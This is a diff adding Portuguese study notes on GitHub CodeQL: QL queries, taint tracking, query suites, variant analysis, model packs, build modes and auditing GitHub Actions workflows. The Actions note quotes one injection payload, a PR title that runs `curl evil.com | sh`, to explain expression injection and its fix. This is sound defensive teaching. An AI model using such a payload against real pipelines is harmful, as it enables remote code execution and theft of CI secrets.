@@ -1,0 +1,150 @@
+TOPIC: GitHub CodeQL (github/codeql) — Motor de Análise Semântica de Código (Variant Analysis), Bancos de Dados AST/CFG/DFG e Consultas Declarativas QL de Taint Tracking (DataFlow::PathGraph)
+SOURCES: https://raw.githubusercontent.com/github/codeql/main/README.md | https://docs.github.com/en/code-security/concepts/code-scanning/codeql/codeql-cli
+
+===NOTE===
+1071|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg|**GitHub CodeQL (`github/codeql`)**: Arquitetura de **Análise Semântica de Código (*Code as Data*)**, Extratores de Linguagem e Bancos Relacionais (`AST`, `CFG`, `DFG`)|Criado originalmente pela **Semmle** (pesquisa da Universidade de Oxford) e hoje motor central do **GitHub Advanced Security / Code Scanning (`github/codeql`)**, o **CodeQL** revolucionou a Análise Estática de Segurança (SAST) e a pesquisa de vulnerabilidades (*Variant Analysis*) ao tratar **código-fonte como um banco de dados relacional consultável**!|Qual é a diferença arquitetural entre um buscador de padrões sintáticos e o **CodeQL**? Conforme documenta o guia oficial do `codeql-cli`, o processo do CodeQL ocorre em três fases: **(1) `codeql database create`** — um **Extrator (*Extractor*)** específico da linguagem intercepta a compilação real (para linguagens compiladas como **C/C++, C#, Go, Java, Kotlin, Rust e Swift**) ou analisa os módulos diretamente (para **JavaScript/TypeScript, Python, Ruby e GitHub Actions**), extraindo a **Árvore de Sintaxe Abstrata (`AST`)**, o **Grafo de Fluxo de Controle (`CFG`)**, a **Hierarquia de Tipos** e o **Grafo de Fluxo de Dados (`DFG`)** em um banco relacional imutável!|Depois, **(2) `codeql database analyze`** executa consultas escritas na linguagem lógica declarativa orientada a objetos **QL (`.ql`)** (derivada de *Datalog*), gerando alertas interprocedurais precisos em **SARIF**; e **(3) `codeql github upload-results`** publica os caminhos de código no GitHub!|```bash
+# Criar bancos de dados CodeQL para um repositorio multi-linguagem (Java e Python) e executar a analise gerando SARIF
+codeql database create codeql-dbs \
+  --source-root=. \
+  --db-cluster \
+  --language=java,python
+
+codeql database analyze codeql-dbs/python \
+  codeql/python-queries:codeql-suites/python-security-extended.qls \
+  --format=sarif-latest \
+  --output=python-results.sarif
+```|Observe a flag **`--db-cluster`** no comando `codeql database create` acima: quando um repositório contém múltiplas linguagens (por exemplo, backend em `java` ou `go` e scripts/serviços em `python` e `javascript`), `--db-cluster` cria sub-bancos separados para cada linguagem em uma única invocação!|Nota técnica da documentação oficial: a CLI do CodeQL requer distribuições Linux baseadas em `glibc` (Ubuntu/Debian/RHEL) e não suporta diretamente containers `musl` (Alpine Linux) sem camada de compatibilidade.|codeql-linguagem-ql-predicados-classes-logica-declarativa-datalog, codeql-analise-fluxo-dados-taint-tracking-sources-sinks-sanitizers, mobsf-mobsfscan-sast-shift-left-codigo-java-kotlin-swift-objc-sarif
+
+===NOTE===
+1072|codeql-linguagem-ql-predicados-classes-logica-declarativa-datalog|Fundamentos da Linguagem **QL (`.ql`)** no CodeQL: Estrutura **`from ... where ... select`**, Predicados Lógicos, Classes de AST e Recursão Transitiva (`+` e `*`)|Por que a linguagem **QL** do CodeQL parece SQL à primeira vista (`from ... where ... select`), mas é capaz de atravessar chamadas recursivas e hierarquias de herança complexas em segundos?|Porque sob a sintaxe familiar `from <variaveis> where <condicoes_logicas> select <resultado>`, o QL é uma **Linguagem de Programação em Lógica Declarativa baseada em Datalog** com semântica de ponto fixo (*least fixed point*)!|Em uma consulta `.ql`, você declara variáveis tipadas pelas classes da biblioteca padrão da linguagem (ex.: `import python`, `import javascript`, `import cpp`, `import java`): **`Function`** (funções/métodos), **`Call` / `MethodCall`** (chamadas de função), **`Expr`** (expressões), **`IfStmt`** (blocos condicionais) e **`Parameter`**; além disso, os operadores de **Fechamento Transitivo `+` (1 ou mais passos)** e **`*` (0 ou mais passos)** permitem consultar em 1 caractere se uma classe herda transitivamente de outra ou se uma função chama outra através de `N` camadas!|```ql
+/**
+ * @name Funcoes Python que invocam eval() ou exec() diretamente
+ * @kind problem
+ * @problem.severity error
+ * @id py/custom-direct-eval-call
+ */
+import python
+
+from Call call, Name funcName
+where
+  call.getFunc() = funcName and
+  funcName.getId() in ["eval", "exec"]
+select call, "Chamada perigosa a " + funcName.getId() + "() detectada dentro do modulo."
+```|Repare no bloco de metadados **`/** ... @name ... @kind problem ... */`** no topo da consulta `.ql`: no CodeQL, esse cabeçalho **JSDoc/QLDoc não é um comentário decorativo** — ele é obrigatório para o gerador SARIF saber se a query retorna um alerta simples (`@kind problem`) ou um grafo completo de fluxo de dados (`@kind path-problem`), qual é a severidade (`@problem.severity`) e qual é o CWE (`@tags security external/cwe/cwe-094`)!|Use a extensão oficial **`CodeQL for Visual Studio Code` (`GitHub.vscode-codeql`)** para escrever queries `.ql` com autocompletar (`IntelliSense`) e visualização interativa da AST (`View AST`).|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-analise-fluxo-dados-taint-tracking-sources-sinks-sanitizers, bandit-anatomia-plugin-ast-visitor-blacklist-customizado
+
+===NOTE===
+1073|codeql-analise-fluxo-dados-taint-tracking-sources-sinks-sanitizers|Análise Interprocedural de **Fluxo de Dados e *Taint Tracking*** no CodeQL (`DataFlow::ConfigSig` / `TaintTracking::Global`): **`isSource`**, **`isSink`** e **`isBarrier`**|O verdadeiro superpoder do CodeQL sobre scanners baseados em regex ou AST local é a sua capacidade de realizar **Taint Tracking Interprocedural Global**: rastrear um dado não-confiável controlado pelo usuário (**`Source`**) desde o controlador HTTP (`req.query.id`), passando por 12 funções, 4 objetos DTO e 3 arquivos diferentes, até chegar a uma operação perigosa (**`Sink`**, como `cursor.execute(sql)` ou `os.system(cmd)`) — verificando se em algum ponto do caminho houve uma função de validação/escape (**`Barrier` / `Sanitizer`**)!|Na API moderna do CodeQL (`DataFlow::ConfigSig` e `TaintTracking::Global<MyConfig>`), você modela qualquer vulnerabilidade de injeção implementando apenas três predicados em um módulo `module MyFlowConfig implements DataFlow::ConfigSig`: **(1) ` predicate isSource(DataFlow::Node source)`**; **(2) `predicate isSink(DataFlow::Node sink)`**; e **(3) `predicate isBarrier(DataFlow::Node node)`** (e opcionalmente `isAdditionalFlowStep` para propagar o taint através de serializadores customizados)!|Qual é a diferença entre `DataFlow` e `TaintTracking` no CodeQL? **`DataFlow`** rastreia apenas quando o valor exato é preservado (`y = x`), enquanto **`TaintTracking`** rastreia mesmo quando o valor contaminado é modificado ou concatenado (`y = "SELECT * FROM t WHERE id=" + x`)!|```ql
+/**
+ * @name Fluxo de Taint de entrada HTTP ate execucao de comando de sistema
+ * @kind path-problem
+ * @problem.severity error
+ * @id js/custom-command-injection-flow
+ */
+import javascript
+import DataFlow::PathGraph
+
+module CmdInjectionConfig implements DataFlow::ConfigSig {
+  predicate isSource(DataFlow::Node source) {
+    source instanceof RemoteFlowSource
+  }
+
+  predicate isSink(DataFlow::Node sink) {
+    exists(SystemCommandExecution sys | sink = sys.getACommandArgument())
+  }
+}
+
+module CmdInjectionFlow = TaintTracking::Global<CmdInjectionConfig>;
+
+from CmdInjectionFlow::PathNode source, CmdInjectionFlow::PathNode sink
+where CmdInjectionFlow::flowPath(source, sink)
+select sink.getNode(), source, sink, "Comando de sistema construido a partir de $@.", source.getNode(), "entrada HTTP nao confiavel"
+```|Olhe que arquitetura limpa na query `@kind path-problem` acima: ao importar **`DataFlow::PathGraph`** e selecionar `select sink.getNode(), source, sink, ...`, o GitHub Code Scanning e o VS Code desenham na tela do desenvolvedor **cada linha e cada chamada de função intermediária por onde o dado malicioso viajou desde a requisição HTTP (`RemoteFlowSource`) até o `child_process.exec`**!|Quando um time usa uma função interna de validação (ex.: `validarUuidEstrito(input)`), basta adicioná-la em `predicate isBarrier(DataFlow::Node node)` para eliminar falsos positivos em todo o repositório.|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-linguagem-ql-predicados-classes-logica-declarativa-datalog, codeql-variant-analysis-pesquisa-vulnerabilidades-zero-day-escala
+
+===NOTE===
+1074|codeql-suites-consultas-default-security-extended-security-and-quality|Suítes Oficiais de Consultas do CodeQL (**`.qls`**): Diferenças entre **`default`**, **`security-extended`** e **`security-and-quality`** e Filtros de Query Suite|Ao configurar o CodeQL no GitHub Actions ou via `codeql database analyze`, qual **Query Suite (`.qls`)** você deve escolher? Muitos engenheiros deixam apenas o conjunto `default` e não percebem que dezenas de regras importantes de segurança não estão rodando!|O repositório oficial `github/codeql` fornece três suítes graduadas para cada linguagem: **(1) `<lang>-code-scanning.qls` (`default`)** — executa apenas as regras de segurança de **altíssima precisão e baixíssimo falso positivo**, ideal como bloqueador obrigatório (*Merge Gate*) em Pull Requests; **(2) `<lang>-security-extended.qls` (`security-extended`)** — adiciona dezenas de consultas de segurança com precisão média/alta e heurísticas mais amplas de *taint tracking* (recomendado pela própria GitHub para auditorias completas de AppSec!); e **(3) `<lang>-security-and-quality.qls`** — inclui todas as regras de `security-extended` somadas a regras de manutenibilidade, *dead code* e confiabilidade!|Além disso, você pode criar seu próprio arquivo **`.qls` (*Query Suite YAML*)** combinando seletores `queries`, `qlpack` e filtros `include` / `exclude` por `@precision`, `@problem.severity` ou `@tags`!|```yaml
+# custom-secops-suite.qls — Suite CodeQL customizada incluindo regras de seguranca com precisao high/very-high e consultas internas
+- description: Suite Corporativa de AppSec (CodeQL Security Extended + Regras Internas)
+- qlpack: codeql/python-queries
+- include:
+    kind:
+      - problem
+      - path-problem
+    precision:
+      - high
+      - very-high
+    tags contain:
+      - security
+- exclude:
+    id: py/clear-text-logging-sensitive-data
+```|Executar a suíte **`default`** de forma síncrona nos Pull Requests (bloqueando o merge em menos de 3 minutos sem ruído) e agendar a suíte **`security-extended`** em um workflow semanal noturno para a equipe de AppSec triar no GitHub Security Tab / DefectDojo combina velocidade para o desenvolvedor com profundidade para a segurança.|Use `codeql resolve queries custom-secops-suite.qls` na CLI para testar e listar exatamente quais arquivos `.ql` serão executados pela sua suíte customizada antes de colocá-la em produção.|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-analise-fluxo-dados-taint-tracking-sources-sinks-sanitizers, defectdojo-importacao-reimportacao-relatorios-sarif-cicd-deduplicacao
+
+===NOTE===
+1075|codeql-variant-analysis-pesquisa-vulnerabilidades-zero-day-escala|**Variant Analysis** com CodeQL e **Multi-Repository Variant Analysis (MRVA)**: Encontrando Todas as Variantes de um *Zero-Day / Bug* em Milhares de Repositórios|O conceito de **Variant Analysis (Análise de Variantes)** é a razão pela qual equipes de pesquisa de vulnerabilidades (como o **GitHub Security Lab**, Google Project Zero e Microsoft MSRC) usam o CodeQL diariamente.|Como funciona o ciclo de *Variant Analysis*? Quando uma vulnerabilidade é descoberta em uma auditoria manual, pentest ou programa de Bug Bounty (o "Bug Semente"), um engenheiro comum apenas corrige aquela linha de código específica e fecha o chamado. Já o engenheiro de segurança que pratica **Variant Analysis** faz uma pergunta muito mais estratégica: ***"Qual é o padrão semântico exato que tornou essa linha vulnerável, e em quais outros lugares deste repositório — ou dos outros 1.000 repositórios da empresa — nós cometemos exatamente o mesmo erro?"***|Você transforma o bug encontrado em uma consulta `.ql` generalizada e a executa contra o banco do projeto ou, usando o **Multi-Repository Variant Analysis (MRVA)** no VS Code + GitHub Actions, dispara a consulta em paralelo contra **até 1.000 repositórios de uma só vez**!|```bash
+# Baixar pacotes oficiais de queries do CodeQL via CLI e executar uma consulta customizada de Variant Analysis contra multiplos bancos
+codeql pack download codeql/python-queries codeql/javascript-queries
+codeql database analyze codeql-dbs/python \
+  ./queries-internas/variante-idor-checkout.ql \
+  --format=sarif-latest \
+  --output=variant-hunt.sarif
+```|Na prática corporativa, sempre que um pentest externo ou incidente de produção encontrar uma falha de lógica ou autorização (ex.: um endpoint interno que esqueceu de chamar o decorador `@require_tenant_scope` antes de acessar o banco), escreva uma query `.ql` de 15 linhas que verifica todos os endpoints que acessam o banco sem o decorador: você não apenas encontra todas as variantes ocultas hoje, como impede que o erro volte a acontecer no futuro!|Adicione um teste unitário para sua nova query `.ql` usando **`codeql test run`**!|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-linguagem-ql-predicados-classes-logica-declarativa-datalog, codeql-analise-fluxo-dados-taint-tracking-sources-sinks-sanitizers
+
+===NOTE===
+1076|codeql-model-packs-data-extensions-frameworks-internos-yaml|Extensão Semântica sem Escrever Código QL: **CodeQL Model Packs & Data Extensions (`models-as-data` em YAML)** para Mapear Bibliotecas Internas|Imagine que sua empresa possui uma biblioteca interna proprietária em Java, C#, Python ou Go (ex.: `br.com.empresa.http.InternalRequest` para ler dados do usuário e `br.com.empresa.db.CustomJdbcWrapper.runRawSql()` para executar queries no banco).|Por que o CodeQL padrão pode não reportar um SQL Injection quando os dados passam por essa biblioteca interna? Porque o pacote oficial do CodeQL conhece frameworks públicos (Spring, Django, Express, Hibernate, JDBC), mas **não sabe que `InternalRequest.getHeader()` é um `Source` de dados não-confiáveis nem que `CustomJdbcWrapper.runRawSql()` é um `Sink` de SQL Injection**!|Em vez de ter que reescrever todas as consultas `.ql` oficiais da GitHub, o CodeQL introduziu os **Model Packs (`models-as-data` / Data Extensions em YAML)**: você escreve um simples arquivo YAML declarando `sourceModel`, `sinkModel` e `summaryModel` (propagação de taint) para os métodos da sua biblioteca interna, e **todas as centenas de queries oficiais de SQLi, XSS, SSRF e Command Injection do CodeQL passam automaticamente a enxergar seus métodos internos**!|```yaml
+# extensions/custom-corp-models.yml — Declarar Sources, Sinks e Summaries de bibliotecas internas em YAML (Models as Data)
+extensions:
+  - addsTo:
+      pack: codeql/java-all
+      extensible: sourceModel
+    data:
+      - ["br.com.empresa.http", "InternalRequest", True, "getUntrustedParam", "(String)", "", "ReturnValue", "remote", "manual"]
+  - addsTo:
+      pack: codeql/java-all
+      extensible: sinkModel
+    data:
+      - ["br.com.empresa.db", "CustomJdbcWrapper", True, "runRawSql", "(String)", "", "Argument[0]", "sql-injection", "manual"]
+```|Olhe o ganho de escala de engenharia dos **Data Extensions (`models-as-data`)**: ao publicar um único pacote `corp-secops/java-internal-models` (via `codeql pack publish`) e passá-lo com `--model-packs`, você ensina a semântica dos seus SDKs internos para todas as queries do CodeQL sem duplicar uma única linha de lógica `.ql`!|Você também pode usar o editor visual **`CodeQL Model Editor`** dentro da extensão oficial do VS Code para gerar esses arquivos YAML com poucos cliques.|codeql-analise-fluxo-dados-taint-tracking-sources-sinks-sanitizers, codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-testes-unitarios-qlpacks-codeql-test-run-expected
+
+===NOTE===
+1077|codeql-modos-build-compiled-languages-none-autobuild-manual|Criando Bancos CodeQL para Linguagens Compiladas (**C/C++, Java, Kotlin, C#, Go, Rust, Swift**): Modos **`build-mode: none`**, **`autobuild`** e **`manual`**|Historicamente, analisar linguagens compiladas (como **Java, Kotlin, C# e C/C++**) no CodeQL exigia sempre compilar o projeto inteiro dentro do pipeline de segurança para que o extrator do CodeQL interceptasse as chamadas ao compilador (`javac`, `kotlinc`, `csc`, `gcc`, `clang`).|Hoje, a CLI moderna do CodeQL suporta três modos de construção (**`--build-mode`**) que você deve escolher de acordo com a linguagem e a velocidade desejada: **(1) `--build-mode=none` (*Buildless / Sem Compilação*)** — já suportado para **Java, C# e Rust** (além de Python/JS/Ruby), gera o banco de dados CodeQL analisando diretamente o código-fonte e resolvendo dependências sem precisar rodar o build completo (muito mais rápido e resiliente quando o build exige credenciais ou infraestrutura complexa!); **(2) `--build-mode=autobuild`** — o CodeQL detecta automaticamente Maven, Gradle, MSBuild, Ant ou CMake e executa o build;|e **(3) `--build-mode=manual` (`--command="..."`)** — você passa o script exato de compilação (obrigatório para builds C/C++ customizados)!|```bash
+# Comparar a criacao de banco CodeQL em modo Buildless (--build-mode=none para Java) vs modo Manual (--command para C/C++)
+codeql database create java-db \
+  --language=java \
+  --build-mode=none \
+  --source-root=.
+
+codeql database create cpp-db \
+  --language=cpp \
+  --command="make -j4 clean all" \
+  --source-root=.
+```|Quando usar `--build-mode=none` vs `--build-mode=manual` em projetos **Java / C#**? Use **`--build-mode=none`** para triagem rápida em larga escala (ou quando você não tem acesso aos servidores de artefatos privados do cliente durante uma auditoria de código!) e use **`--build-mode=autobuild` / `manual`** nos repositórios onde parte do código-fonte é gerada dinamicamente durante a compilação (como *annotation processors*, Protobuf ou gRPC)!|Em projetos **C/C++**, se o comando `make` já tiver compilado os arquivos `.o` antes de você chamar `codeql database create`, o compilador não fará nada e o banco ficará vazio: por isso inclua sempre `make clean` (ou `cmake --build . --clean-first`) dentro de `--command`!|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-otimizacao-performance-ram-threads-cache-ci-cd, mobsf-mobsfscan-sast-shift-left-codigo-java-kotlin-swift-objc-sarif
+
+===NOTE===
+1078|codeql-auditoria-workflows-github-actions-injection-pwn-requests|Auditoria de Segurança de Pipelines CI/CD (**GitHub Actions**) com CodeQL (`--language=actions`): Detectando **Expression Injection** e **`pull_request_target` (*Pwn Requests*)**|Um vetor crítico de comprometimento de Supply Chain (responsável por ataques famosos a repositórios open-source e corporativos) não está no código da aplicação, mas sim dentro dos arquivos **`.github/workflows/*.yml` do GitHub Actions**!|Por isso o CodeQL adicionou o extrator oficial **`--language=actions` (`codeql/actions-queries`)**! Ele analisa semanticamente todos os seus workflows do GitHub Actions em busca de vulnerabilidades graves de CI/CD:|Veja o que o pacote `codeql/actions-queries` detecta automaticamente: **(1) `actions/code-injection` (*Expression Injection*)** — quando um workflow interpola um valor controlado por um atacante externo como `${{ github.event.issue.title }}`, `${{ github.event.pull_request.head.ref }}` ou `${{ github.event.comment.body }}` diretamente dentro de um bloco `run: |` de shell Bash (permitindo execução remota de código no runner e roubo do `GITHUB_TOKEN`!); **(2) `actions/ untrusted-checkout-in-privileged-workflow` (*Pwn Request*)** — quando um workflow disparado por **`pull_request_target`** (que tem acesso a `secrets` e `GITHUB_TOKEN` de escrita!) faz `actions/checkout` do código não-confiável do fork do PR e o executa!; e **(3) `actions/unpinned-tag`** — uso de Actions de terceiros sem fixar o hash SHA-1 completo de 40 caracteres!|```bash
+# Criar um banco de dados CodeQL especifico para auditar os arquivos .github/workflows/*.yml (--language=actions)
+codeql database create actions-db --language=actions --source-root=.
+codeql database analyze actions-db \
+  codeql/actions-queries \
+  --format=sarif-latest \
+  --output=actions-security.sarif
+```|Como corrigir imediatamente um alerta de **`actions/code-injection`** em um bloco `run:` do GitHub Actions? **Nunca** escreva `run: echo "${{ github.event.pull_request.title }}"` direto no script Bash (pois o GitHub expande `${{ ... }}` como texto antes de entregar ao Bash, permitindo que um título de PR como `"; curl evil.com | sh #` injete comandos!); em vez disso, passe o valor através de uma **Variável de Ambiente do Step (`env: PR_TITLE: ${{ github.event.pull_request.title }}`)** e referencie `"$PR_TITLE"` dentro do Bash!|Combine o CodeQL `--language=actions` com o **OpenSSF Scorecard (`Pinned-Dependencies` & `Token-Permissions`)** para blindar seus pipelines de CI/CD.|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, scorecard-checks-criticos-token-permissions-pinned-dependencies-branch-protection, steampipe-auditoria-postura-github-supply-chain-branch-protection-actions
+
+===NOTE===
+1079|codeql-testes-unitarios-qlpacks-codeql-test-run-expected|Engenharia de Qualidade em Regras SAST: Pacotes **`qlpack.yml`** e Testes Unitários Automatizados de Consultas `.ql` com **`codeql test run`** (`.expected`)|Em equipes maduras de Engenharia de Segurança, regras de detecção de vulnerabilidades (`.ql`) são tratadas como código de produção: toda consulta customizada precisa residir em um **Pacote CodeQL (`qlpack.yml`)** versionado no Git e possuir **Testes Unitários Automatizados (`codeql test run`)** que garantam que ela detecta os verdadeiros positivos e não dispara em código seguro!|Como funciona a estrutura de um teste unitário no CodeQL? Para uma consulta `SqlInjectionCustom.ql`, você cria uma pasta de teste contendo: **(1)** Um pequeno arquivo de código de exemplo (ex.: ` test.py`) com casos vulneráveis (`# BAD`) e casos seguros sanitizados (`# GOOD`); **(2)** Um arquivo `.qlref` apontando para a sua query; e **(3)** Um arquivo de gabarito **`SqlInjectionCustom.expected`** contendo a tabela exata de linhas e mensagens que a query deve produzir!|Ao rodar **`codeql test run ./tests`**, o CodeQL constrói um mini-banco de dados de teste em segundos, executa a query e compara a saída com o arquivo `.expected` (`diff`), falhando se qualquer falso positivo novo surgir ou se um caso vulnerável deixar de ser detectado!|```yaml
+# qlpack.yml — Definicao de um pacote de consultas CodeQL customizadas da equipe de AppSec com dependencia da biblioteca Python
+name: corp-secops/python-custom-queries
+version: 1.0.0
+dependencies:
+  codeql/python-all: "*"
+extractor: python
+```|Para inicializar um novo pacote de consultas ou um pacote de testes pela linha de comando, basta rodar **`codeql pack init corp-secops/minhas-queries`** e instalar as dependências com **`codeql pack install`**!|Ao abrir um Pull Request adicionando ou alterando uma regra `.ql` ou um Model Pack YAML da empresa, configure o GitHub Actions para rodar `codeql test run`: isso garante zero regressões nas regras SAST da organização.|codeql-linguitetura-ql-predicados-classes-logica-declarativa-datalog, codeql-model-packs-data-extensions-frameworks-internos-yaml, codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg
+
+===NOTE===
+1080|codeql-otimizacao-performance-ram-threads-cache-ci-cd|Otimização de Performance e Recursos do CodeQL em Grande Escala: Calibração de **`--threads`**, **`--ram`**, Compilation Cache e Exclusão de Caminhos (`paths-ignore`)|Ao rodar o CodeQL sobre monorepos grandes de **C/C++, Java ou TypeScript**, duas configurações incorretas de infraestrutura podem fazer a análise demorar horas ou falhar com erro de falta de memória (`Out of Memory — OOM` no avaliador QL): subdimensionar a RAM reservada para o avaliador ou analisar milhões de linhas de código minificado/gerado (`dist/`, `vendor/`, `node_modules/`).|Conforme recomenda a documentação oficial (`Recommended hardware resources for running CodeQL`), utilize três alavancas técnicas no `codeql database analyze`: **(1) `--threads=0`** — instrui o CodeQL a detectar e usar todos os núcleos de CPU disponíveis no runner; **(2) `--ram=<MB>`** — define o orçamento explícito de memória RAM (em megabytes) para o motor de avaliação QL e JVM (deixando pelo menos 1,5 GB a 2 GB livres para o sistema operacional do container para evitar que o Linux OOM Killer mate o processo!);|e **(3) `paths-ignore` / filtros de extração** para excluir código de terceiros (`vendor/`, `third_party/`, `*.min.js`)!|```bash
+# Executar o codeql database analyze utilizando todos os nucleos de CPU (--threads=0), alocando 12 GB de RAM (--ram=12288) e cache
+codeql database analyze codeql-dbs/java \
+  codeql/java-queries:codeql-suites/java-security-extended.qls \
+  --threads=0 \
+  --ram=12288 \
+  --format=sarif-latest \
+  --output=java-extended.sarif
+```|Dica para linguagens dinâmicas (**JavaScript/TypeScript e Python**): arquivos JavaScript *bundled/minified* (`*.bundle.js`, `*.min.js`, `dist/`, `build/`) não devem ser incluídos no banco CodeQL — além de triplicarem o tempo de análise e consumo de RAM, alertas apontando para a coluna `48592` de um arquivo minificado não servem para o desenvolvedor corrigir o código original!|Se uma única consulta customizada estiver demorando muito na sua suíte, adicione a flag **`--evaluator-log=eval.log`** e execute `codeql generate log-summary eval.log` para identificar exatamente qual predicado `.ql` está gerando um produto cartesiano custoso.|codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg, codeql-suites-consultas-default-security-extended-security-and-quality, codeql-modos-build-compiled-languages-none-autobuild-manual
